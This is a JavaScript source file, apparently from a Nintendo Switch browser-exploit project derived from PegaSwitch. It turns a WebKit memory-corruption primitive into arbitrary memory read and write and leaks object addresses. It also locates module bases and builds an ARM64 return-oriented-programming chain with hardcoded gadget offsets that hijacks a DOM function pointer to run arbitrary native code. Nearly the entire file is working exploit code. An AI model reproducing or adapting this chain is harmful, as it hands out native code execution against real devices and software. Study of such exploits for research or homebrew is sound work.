import * as utils from "./utils.js";

export default class ExploitPrimitives {
  constructor(exploitMe) {
    this.invokeGC();

    utils.log("invoked gc");

    // va[4, 5, and 6] control where vb points
    this.va = exploitMe.va;
    // vb is a window into memory that is manipulated by va
    this.vb = exploitMe.vb;
    this.leakee = exploitMe.leakee;
    this.leakaddr = exploitMe.leakaddr;

    utils.log("leak addr " + this.leakaddr);
    
    utils.log("copied");
    
    this.allocated = {};
    this.sp = null;

    this.func = document.getElementById;
    this.func.apply(document, [""]); // "Ensure the func pointer is cached at 8:9"
    this.funcaddr = null;
    
    // "This is the base address for getElementById in the webkit module"
    //  (does that mean that this is the offset within the webkit module of getElementById
    //   and that by subtracting this from the address of getElementById, we get the address
    //   of the webkit module?)
    this.funcbase = 0x835DC4;
    

    //  (find address of webkit module?)
    //  this points a dozen or so bytes before an NRO marker
    let tlfuncaddr = this.getAddr(this.func);
    this.funcaddr = this.read64(tlfuncaddr, 6);
    this.base = utils.add64(this.read64(this.funcaddr, 8), -this.funcbase);
    utils.log("Base address: " + utils.toString64(this.base));
    
    this.mainaddr = this.walkList();
    if(!this.mainaddr) {
      utils.log("NRO traversal failed");
      throw("halt; NRO traversal failiure.");
    }
    utils.log("Main address: " + utils.toString64(this.mainaddr));

    this.meminfobuf = this.malloc(0x20);
    this.pageinfobuf = this.malloc(0x8);
  }

  // addr is expected to be a pair of 32-bit words
  read32(addr, offset) {
    if(arguments.length == 1) {
      offset = 0;
    }

    this.va[4] = addr[0];
    this.va[5] = addr[1];
    this.va[6] = 1 + offset;

    return this.vb[offset];
  }

  read4(addr, offset) {
    return this.read32(addr, offset);
  }
  
  // addr is expected to be a pair of 32-bit words
  read64(addr, offset) {
    if(arguments.length == 1) {
      offset = 0;
    }
    return [this.read32(addr, offset), this.read32(addr, offset + 1)];
  }

  read8(addr, offset) {
    return this.read64(addr, offset);
  }

  // addr is expected to be a pair of 32-bit words
  write32(val, addr, offset) {
    if(arguments.length == 2) {
      offset = 0;
    }

    this.va[4] = addr[0];
    this.va[5] = addr[1];
    this.va[6] = 1 + offset;

    this.vb[offset] = val;
  }

  write4(val, addr, offset) {
    this.write32(val, addr, offset);
  }

  // addr is expected to be a pair of 32-bit words
  write64(val, addr, offset) {
    if(arguments.length == 2) {
      offset = 0;
      if(typeof(val) == "number") {
        val = [val, 0];
      }
    }
    this.write32(val[0], addr, offset);
    this.write32(val[1], addr, offset + 1);
  }

  write8(val, addr, offset) {
    this.write64(val, addr, offset);
  }
  
  malloc(length) {
    var obj = new ArrayBuffer(length);
    var addr = this.read64(this.read64(this.getAddr(obj), 4), 6);
    this.allocated[addr] = obj;
    return addr;
  }

  free(addr) {
    this.allocated[addr] = 0;
  }

  mempeek(addr, size, peeker) {
    let ab = new ArrayBuffer(0);
    let taddr = this.read64(this.getAddr(ab), 4);
    
    let origPtr = this.read64(taddr, 6);
    let origSize = this.read32(taddr, 8);
    this.write64(addr, taddr, 6);
    this.write32(size, taddr, 8);

    let caught = false;
    let ex;
    let ret;
    try { // don't let exceptions botch this and crash the console
      ret = peeker(ab);
    } catch(e) {
      ex = e;
      caught = true;
    }
    
    this.write64(origPtr, taddr, 6);
    this.write32(origSize, taddr, 8);

    if(caught) {
      throw ex;
    }
    
    return ret;
  }

  read(addr, target, length) {
    if(arguments.length == 2) {
      length = target.length;
    }

    return this.mempeek(addr, length, (ab) => {
      let u8 = new Uint8Array(ab);
      target.set(u8);
      return target;
    });
  }

  write(addr, value, length) {
    if(arguments.length == 2) {
      length = value.length;
    }

    return this.mempeek(addr, length, (ab) => {
      let u8 = new Uint8Array(ab);
      for(let i = 0; i < length; i++) {
        u8[i] = value[i];
      }
      return true;
    });
  }
  
  invokeGC() {
    utils.log("Beginning GC force");
    function sub(depth) {
      if(depth > 0) {
        var arr = [];
        for(var i = 0; i < 10; ++i)
          arr.push(new Uint8Array(0x40000));
        while(arr.length > 0)
          arr.shift();
        sub(depth - 1);
      }
    }
    sub(20);
    utils.log("GC should be solid");
  }

  // returns one of those pairs of 32-bit words
  getAddr(obj) {
    this.leakee['b'] = {'a' : obj};
    return this.read64(this.read64(this.leakaddr, 4), 4);
  }

  // return an offset into the main application binary
  mref(off) {
    return utils.add64(this.mainaddr, off);
  }
  
  // args: integer arguments
  // fargs: floating point arguments
  // registers: array of raw registers (x16 and x30 not assignable)
  // dump_regs: should registers be dumped upon return?
  call(funcptr, args, fargs, registers, dump_regs) {
    if(typeof(funcptr) == 'number') {
      funcptr = utils.add2(this.mainaddr, funcptr);
    }
    switch(arguments.length) {
      case 1:
        args = [];
      case 2:
        fargs = [];
      case 3:
        registers = [];
      case 4:
        dump_regs = false;
    }
    
    var sp = this.getSP();

//    utils.dlog('Starting holy rop');
    var jaddr = this.mref(0x39FEEC); // First gadget addr, loads X8 with a fixed address.
//    utils.dlog('New jump at ' + utils.paddr(jaddr));

//    utils.dlog('Setting up structs');

    var fixed = this.mref(0x91F320);
    var saved = new Uint32Array(12);
    for(var i = 0; i < saved.length; ++i) {
      saved[i] = this.read4(fixed, i);
    }

    // Begin Gadgets
    var load_x0_w1_x2_x9_blr_x9 = this.mref(0x4967F0);
    var load_x2_x30_mov_sp_into_x2_br_x30 = this.mref(0x433EB4);
    var load_x2_x8_br_x2 = this.mref(0x1A1C98);
    var load_x30_from_sp_br_x2 = this.mref(0x3C2314);
    var returngadg = this.mref(0x181E9C);

    var savegadg = this.mref(0x4336B0);
    var loadgadg = this.mref(0x433620);
    var loadgadg_stage2 = this.mref(0x3A869C);

    var load_x19 = this.mref(0x6C3E4);
    var str_x20 = this.mref(0x117330);
    var str_x8 = this.mref(0x453530);
    var load_and_str_x8 = this.mref(0x474A98);
    var str_x1 = this.mref(0x581B8C);
    var mov_x2_into_x1 = this.mref(0x1A0454);
    var str_x0 = this.mref(0xFDF4C);
    var str_x9 = this.mref(0x1F8280);
    var mov_x19_into_x0 = this.mref(0x12CC68);

    // End Gadgets

    var context_load_struct = this.malloc(0x200);
    var block_struct_1 = this.malloc(0x200);
    var block_struct_2 = this.malloc(0x200);
    var block_struct_3 = this.malloc(0x200);
    var savearea = this.malloc(0x400);
    var loadarea = this.malloc(0x400);
    var dumparea = this.malloc(0x400);


    // Step 1: Load X8 with a fixed address, control X0:X2

    this.write8(context_load_struct, fixed, 0x00 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x08 >> 2);
    this.write8(load_x2_x30_mov_sp_into_x2_br_x30, fixed, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x18 >> 2);
    this.write8(block_struct_1, fixed, 0x28 >> 2);

    // Step 2: Stack pivot to SP - 0x8000. -0x30 to use a LR-loading gadget.

    sp = utils.add2(sp, -0x8030);
    this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
    this.write8(sp, context_load_struct, 0x68 >> 2);
    this.write8(returngadg, context_load_struct, 0x158 >> 2);
    this.write8(utils.add2(sp, 0x8030), context_load_struct, 0x168 >> 2);

    // Step 3: Perform a full context-save of all registers to savearea.

    this.write8(savearea, block_struct_1, 0x0 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
    this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
    this.write8(savegadg, block_struct_1, 0x38 >> 2);

    this.write8(load_x2_x8_br_x2, sp, 0x28 >> 2);

    sp = utils.add2(sp, 0x30);

    // Step 4: Perform a full context-load from a region we control.

    this.write8(loadarea, block_struct_2, 0x00 >> 2);
    this.write8(loadgadg, block_struct_2, 0x10 >> 2);

    // Step 5: Write desired register contents to the context load region.

    this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
    this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2

    sp = utils.add2(sp, -0x80);

    // Write registers fornative code.
    if(registers.length > 9) {
      for(var i = 9; i < 30 && i < registers.length; i++) {
        this.write8(registers[i], loadarea, (8 * i) >> 2);
      }
    }

    if(registers.length > 0) {
      for(var i = 0; i <= 8 && i < registers.length; i++) {
        this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
      }

      if(registers.length > 19) {
        this.write8(registers[19], sp, 0xC8 >> 2);
      }

      if(registers.length > 29) {
        this.write8(registers[29], sp, 0xD0 >> 2);
      }
    }

    if(args.length > 0) {
      for(var i = 0; i < args.length && i < 8; i++) {
        this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
      }
    }

    if(fargs.length > 0) {
      for(var i = 0; i < fargs.length && i < 32; i++) {
        this.write8(fargs[i], loadarea, (0x110 + 8 * i) >> 2);
      }
    }

    this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
    this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

    // Stack arguments would be bottomed-out at sp + 0xE0...
    // TODO: Stack arguments support. Would just need to figure out how much space they take up
    // and write ROP above them. Note: the user would have to call code that actually used
    // that many stack arguments, or shit'd crash.

    // ROP currently begins at sp + 0xE0

    // Step 6: [Arbitrary code executes here]

    // Step 7: Post-code execution cleanup. Dump all registers to another save area,
    //         return cleanly to javascript.

    this.write8(utils.add2(dumparea, 0x300 - 0x10), sp, (0xE0 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
    this.write8(str_x20, sp, (0xE0 + 0x38) >> 2);                      // Load LR with str_x20
    this.write8(utils.add2(dumparea, 0x308), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
    this.write8(str_x8, sp, (0x120 + 0x18) >> 2);                      // Load LR with str_x8
    this.write8(utils.add2(dumparea, 0x310 - 0x18), sp, (0x140 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
    this.write8(str_x1, sp, (0x140 + 0x18) >> 2);                      // Load LR with str_x1
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x380), sp, (0x160 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
    this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
    this.write8(load_and_str_x8, sp, (0x160 + 0x18) >> 2);             // Load LR with Load, STR X8
    this.write8(utils.add2(dumparea, 0x318 - 0x18), sp, (0x180 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
    this.write8(mov_x2_into_x1, sp, (0x180 + 0x18) >> 2);              // Load LR with mov x1, x2
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x1A0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x320), sp, (0x1A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
    this.write8(str_x0, sp, (0x1A0 + 0x18) >> 2);                      // Load LR with str x0
    this.write8(utils.add2(dumparea, 0x388), sp, (0x1C0 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
    this.write8(utils.add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
    this.write8(load_and_str_x8, sp, (0x1C0 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x1E0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x328 - 0x58), sp, (0x1E0 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
    this.write8(str_x9, sp, (0x1E0 + 0x18) >> 2);                      // Load LR with STR X9
    this.write8(utils.add2(dumparea, 0x390), sp, (0x200 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
    this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
    this.write8(load_and_str_x8, sp, (0x200 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x220 + 0x18) >> 2);     // Load LR with gadget 2

    // Block Struct 3
    this.write8(dumparea, block_struct_3, 0x00 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
    this.write8(savegadg, block_struct_3, 0x38 >> 2);

    this.write8(utils.add2(str_x20, 0x4), sp, (0x240 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
    this.write8(utils.add2(savearea, 0xF8), sp, (0x270 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
    this.write8(utils.add2(dumparea, 0x398), sp, (0x270 + 0x8) >> 2);        // Load X19 with dumparea + 0x398
    this.write8(utils.add2(sp, 0x8080), dumparea, 0x398 >> 2);               // Write SP to dumparea + 0x38
    this.write8(load_and_str_x8, sp, (0x270 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(utils.add2(savearea, 0x100), sp, (0x290 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
    this.write8(utils.add2(dumparea, 0x3A0), sp, (0x290 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A0
    this.write8(returngadg, dumparea, 0x3A0 >> 2);                     // Write return gadget to dumparea + 0x3A0
    this.write8(load_and_str_x8, sp, (0x290 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(utils.add2(savearea, 0xC0), sp, (0x2B0 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
    this.write8(utils.add2(dumparea, 0x3A8), sp, (0x2B0 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A8
    this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);       // Write return gadget to dumparea + 0x3A8
    this.write8(load_and_str_x8, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(savearea, sp, (0x2D0 + 0x8) >> 2);                     // Load X19 with savearea
    this.write8(mov_x19_into_x0, sp, (0x2D0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
    this.write8(loadgadg, sp, (0x2F0 + 0x18) >> 2);                    // Load X30 with context load

    sp = utils.add2(sp, 0x8080);

//    utils.dlog('Assigning function pointer');

//    utils.dlog('Function object at ' + utils.paddr(this.funcaddr));
    var curptr = this.read8(this.funcaddr, 8);
    this.write8(jaddr, this.funcaddr, 8);
//    utils.dlog('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(this.funcaddr, 8)));
//    utils.dlog('Jumping.');
    this.func.apply(0x101);
//    utils.dlog('Jumped back.');

    this.write8(curptr, this.funcaddr, 8);
//    utils.dlog('Restored original function pointer.');

    var ret = this.read8(dumparea, 0x320 >> 2);

    if(dump_regs) {
      utils.log('Register dump post-code execution:');
      for(var i = 0; i <= 30; i++) {
        if(i == 0) {
          utils.log('X0: ' + utils.paddr(this.read8(dumparea, 0x320 >> 2)));
        } else if(i == 1) {
          utils.log('X1: ' + utils.paddr(this.read8(dumparea, 0x310 >> 2)));
        } else if(i == 2) {
          utils.log('X2: ' + utils.paddr(this.read8(dumparea, 0x318 >> 2)));
        } else if(i == 8) {
          utils.log('X8: ' + utils.paddr(this.read8(dumparea, 0x308 >> 2)));
        } else if(i == 9) {
          utils.log('X9: ' + utils.paddr(this.read8(dumparea, 0x328 >> 2)));
        } else if(i == 20) {
          utils.log('X20: ' + utils.paddr(this.read8(dumparea, 0x300 >> 2)));
        } else if(i == 16 || i == 19 || i == 29 || i == 30) { 
          utils.log('X' + i + ': Not dumpable.');
        } else {
          utils.log('X' + i + ': ' + utils.paddr(this.read8(dumparea, (8 * i) >> 2)));
        }
      }
    }

    for(var i = 0; i < saved.length; ++i)
      this.write4(saved[i], fixed, i);
//    utils.dlog('Restored data page.');

//    utils.dlog('Native code at ' + utils.paddr(funcptr) + ' returned: ' + utils.paddr(ret));

    this.free(context_load_struct);
    this.free(block_struct_1);
    this.free(block_struct_2);
    this.free(block_struct_3);
    this.free(savearea);
    this.free(loadarea);
    this.free(dumparea);

//    utils.dlog('Freed all buffers');
    return ret;
  }
  
  // stolen right from PegaSwitch <3
  getSP() {
    if(this.sp !== null) {
      return this.sp; // "This should never change in a session. ... Should."
    }
    
    let jaddr = this.mref(0x39FEEC); // First gadget
    utils.log("New jump at " + utils.toString64(jaddr));
    utils.log("Assigning function pointer");
    
    utils.log("Function object at " + utils.toString64(this.funcaddr));
    let curptr = this.read64(this.funcaddr, 8);
    
    let fixed = this.mref(0x91F320);
    let saved = new Uint32Array(0x18 >> 2);
    for(let i = 0; i < saved.length; i++) {
      saved[i] = this.read32(fixed, i);
    }
    
    let struct1 = this.malloc(0x48);
    let struct2 = this.malloc(0x28);
    let struct3 = this.malloc(0x518);
    let struct4 = this.malloc(0x38);
    
    this.write64(struct1, fixed, 0);
    this.write64(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
    this.write64(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget
    
    this.write64(struct2, struct1, 0x10 >> 2);
    
    this.write64(struct3, struct2, 0);
    this.write64(this.mref(0x2E5F88), struct2, 0x20 >> 2);
    
    this.write64([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
    this.write64(this.mref(0x1892A4), struct3, 0x18 >> 2);
    this.write64(this.mref(0x46DFD4), struct3, 0x20 >> 2);
    this.write64(struct4, struct3, 0x510 >> 2);
    
    this.write64(this.mref(0x1F61C0), struct4, 0x18 >> 2);
    this.write64(this.mref(0x181E9C), struct4, 0x28 >> 2);
    this.write64(this.mref(0x1A1C98), struct4, 0x30 >> 2);
    
    this.write64(jaddr, this.funcaddr, 8);
    utils.log("Patched function address from " + utils.toString64(curptr) + " to " + utils.toString64(this.read64(this.funcaddr, 8)));

    utils.log("Assigned.  Jumping.");
    utils.log(this.func.apply(0x101));
    utils.log("Jumped back.");
    
    this.write64(curptr, this.funcaddr, 8);
    utils.log("Restored original function pointer.");
    
    let sp = utils.add64(this.read64(struct3, 0), -0x18);
    utils.log("Got stack pointer: " + utils.toString64(sp));
    
    for(let i = 0; i < saved.length; i++) {
      this.write32(saved[i], fixed, i);
    }
    utils.log("Restored data page.");
    
    this.free(struct1);
    this.free(struct2);
    this.free(struct3);
    this.free(struct4);
    
    utils.log("Freed buffers");
    
    this.sp = sp;
    
    return sp;
  }
  
  // stolen right from PegaSwitch (<3)
  walkList() {
    let addr = this.base;

    // looks like these "NRO"s are linked, so this traverses the chain to find the last one?
    while(true) {
      let baddr = addr;

      let modoff = this.read32(addr, 1);
      addr = utils.add64(addr, modoff);
      let modstr = this.read32(addr, 6);
      addr = utils.add64(addr, modstr);

      addr = this.read64(addr);
      if(utils.isNullPointer(addr)) {
        break;
      }

      let nro = this.read64(addr, 8);
      if(utils.isNullPointer(nro)) {
        utils.log("Hit RTLD at " + utils.toString64(addr));
        addr = this.read64(addr, 4);
        break;
      }

      if(this.read32(nro, 4) != 0x304f524e) {
        utils.log("Something is wrong. No NRO header at base.");
        break;
      }

      addr = nro;
      utils.log("Found NRO at " + utils.toString64(nro));
    }

    while(true) {
      let nro = this.read64(addr, 8);
      if(utils.isNullPointer(nro)) {
        utils.log("Hm, hit the end of things. Back in RTLD?");
        return;
      }

      if(this.read32(nro, this.read32(nro, 1) >> 2) == 0x30444f4d) {
        if(this.read32(nro, 4) == 0x8DCDF8 && this.read32(nro, 5) == 0x959620) {
          return nro;
        }
      } else {
        utils.log("No valid MOD header. Back at RTLD.");
        break;
      }

      addr = this.read64(addr, 0);
      if(utils.isNullPointer(addr)) {
        utils.log("End of chain.");
        break;
      }
    }
  }

  getTLS() {
    return this.call(0x3ACE54, []);
  }

  queryMem(addr, raw=false) {
    let meminfo = this.meminfobuf;
    let pageinfo = this.pageinfobuf;
    
    let svcQueryMemory = 0x3BBE48;
    
    let memperms = ["NONE", "R", "W", "RW", "X", "RX", "WX", "RWX"];
    let memstates = ["FREE", "RESERVED", "IO", "STATIC", "CODE", "PRIVATE", "SHARED", "CONTINUOUS", "ALIASED", "ALIAS", "ALIAS CODE", "LOCKED"];
    this.call(svcQueryMemory, [meminfo, pageinfo, addr]);

    let ms = this.read8(meminfo, 0x10 >> 2);
    if(!raw && ms[1] == 0 && ms[0] < memstates.length) {
      ms = memstates[ms[0]];
    } else if(!raw) {
      ms = "UNKNOWN";
    }
    let mp = this.read8(meminfo, 0x18 >> 2);
    if(!raw && mp[1] == 0 && mp[0] < memperms.length) {
      mp = memperms[mp[0]];
    }

    let data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];
    
    return data;    
  }
};
